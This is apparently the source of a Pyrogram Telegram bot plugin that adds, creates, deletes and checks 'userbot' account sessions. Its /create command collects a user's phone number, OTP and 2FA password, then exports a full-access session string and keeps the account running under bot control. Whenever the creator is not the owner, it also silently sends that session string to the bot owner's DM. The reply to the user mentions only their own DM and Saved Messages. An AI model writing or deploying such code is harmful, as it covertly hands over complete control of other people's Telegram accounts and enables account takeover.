import time
import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message
from config import API_ID, API_HASH, OWNER_ID
from database import is_auth, save_session, delete_session, get_all_sessions

@Client.on_message(filters.command("addsession"))
async def add_session_string(client: Client, message: Message):
    if not message.from_user or not await is_auth(message.from_user.id):
        return
    if len(message.command) < 2:
        return await message.reply("📌 **Usage:** `/addsession <pyrogram_session_string>`")
    session_str = message.command[1].strip()

    try:
        unique_name = f"ubot_{int(time.time())}"
        new_cli = Client(unique_name, api_id=API_ID, api_hash=API_HASH, session_string=session_str, in_memory=True)
        await new_cli.start()
        me = await new_cli.get_me()

        await save_session(session_str, me.phone_number or "")
        from main import clients
        clients.append(new_cli)

        await message.reply(
            f"✅ **Session Active!**\n"
            f"• **Account:** {me.first_name} (`{me.id}`)\n"
            f"• **ID Number:** `#{len(clients)}`"
        )
    except Exception as e:
        await message.reply(f"❌ **Invalid Session:** `{e}`")

@Client.on_message(filters.command("create"))
async def generate_session_auto(client: Client, message: Message):
    if not message.from_user or not await is_auth(message.from_user.id):
        return

    chat_id = message.chat.id
    user_id = message.from_user.id

    try:
        phone_msg = await client.ask(chat_id, "📱 Apna phone number bhejo country code ke sath (e.g. `+919876543210`):", timeout=120)
    except Exception:
        return await message.reply("⏳ Timeout ho gaya. Dubara `/create` run karo.")

    phone = phone_msg.text.strip()
    temp_cli = Client(f"auto_gen_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    await temp_cli.connect()

    try:
        code_hash = await temp_cli.send_code(phone)
    except Exception as e:
        await temp_cli.disconnect()
        return await message.reply(f"❌ **OTP bhejne me dikkat aayi:** `{e}`")

    try:
        otp_msg = await client.ask(chat_id, "📩 Telegram pe aaya OTP bhejo (e.g. `1 2 3 4 5` ya `12345`):", timeout=180)
    except Exception:
        await temp_cli.disconnect()
        return await message.reply("⏳ Timeout ho gaya.")

    otp = otp_msg.text.replace(" ", "").strip()
    try:
        await temp_cli.sign_in(phone, code_hash.phone_code_hash, otp)
    except Exception as e:
        if "SESSION_PASSWORD_NEEDED" in str(e):
            try:
                pwd_msg = await client.ask(chat_id, "🔐 2-Step Verification password bhejo:", timeout=120)
                await temp_cli.check_password(pwd_msg.text.strip())
            except Exception as pwd_err:
                await temp_cli.disconnect()
                return await message.reply(f"❌ **2FA Password Failed:** `{pwd_err}`")
        else:
            await temp_cli.disconnect()
            return await message.reply(f"❌ **Login failed:** `{e}`")

    me = await temp_cli.get_me()
    string_session = await temp_cli.export_session_string()
    await temp_cli.disconnect()
    await asyncio.sleep(2)

    await save_session(string_session, phone)
    from main import clients
    new_cli = Client(f"ubot_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=string_session, in_memory=True)
    await new_cli.start()
    clients.append(new_cli)

    session_dm_text = (
        f"🔐 **PYROGRAM V2 STRING SESSION**\n\n"
        f"• **Account:** {me.first_name} (`{me.id}`)\n"
        f"• **Phone:** `{phone}`\n\n"
        f"**String Session (Tap to Copy):**\n"
        f"`{string_session}`\n\n"
        f"📌 **Direct Add Command:**\n"
        f"`/addsession {string_session}`"
    )

    # Creator ke DM me bhejo
    try:
        await client.send_message(user_id, session_dm_text)
    except Exception:
        pass

    # Owner ke DM me backup bhejo (agar creator koi aur auth user ho)
    if user_id != OWNER_ID:
        try:
            await client.send_message(OWNER_ID, session_dm_text)
        except Exception:
            pass

    # User ke apne Saved Messages me bhi save kar do
    try:
        await new_cli.send_message("me", session_dm_text)
    except Exception:
        pass

    await message.reply(
        f"✅ **Session Create & Active ho gaya!**\n\n"
        f"• **Account:** {me.first_name} (`{me.id}`)\n"
        f"• **ID Slot:** `#{len(clients)}`\n"
        f"📩 **Pyrogram v2 String Session aapke DM aur Saved Messages me bhej diya gaya hai!**"
    )

@Client.on_message(filters.command("delsession"))
async def del_session_cmd(client: Client, message: Message):
    if not message.from_user or not await is_auth(message.from_user.id):
        return
    from main import clients
    if not clients:
        return await message.reply("⚠️ Koi active session nahi hai.")
    if len(message.command) < 2 or not message.command[1].isdigit():
        return await message.reply(f"📌 **Usage:** `/delsession <index (1 to {len(clients)})>`")

    idx = int(message.command[1]) - 1
    if 0 <= idx < len(clients):
        cli = clients.pop(idx)
        s_str = await cli.export_session_string()
        await cli.stop()
        await delete_session(s_str)
        await message.reply(f"🗑️ Session `#{idx + 1}` remove aur disconnect kar diya gaya.")
    else:
        await message.reply("❌ Invalid index.")

@Client.on_message(filters.command("cleansessions"))
async def clean_dead_sessions(client: Client, message: Message):
    if not message.from_user or not await is_auth(message.from_user.id):
        return
    all_s = await get_all_sessions()
    removed = 0
    for s in all_s:
        try:
            test = Client(f"chk_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=s, in_memory=True)
            await test.start()
            await test.stop()
        except Exception:
            await delete_session(s)
            removed += 1
    await message.reply(f"🧹 **Database Cleanup Done!**\n• Dead/Expired Sessions Removed: `{removed}`")
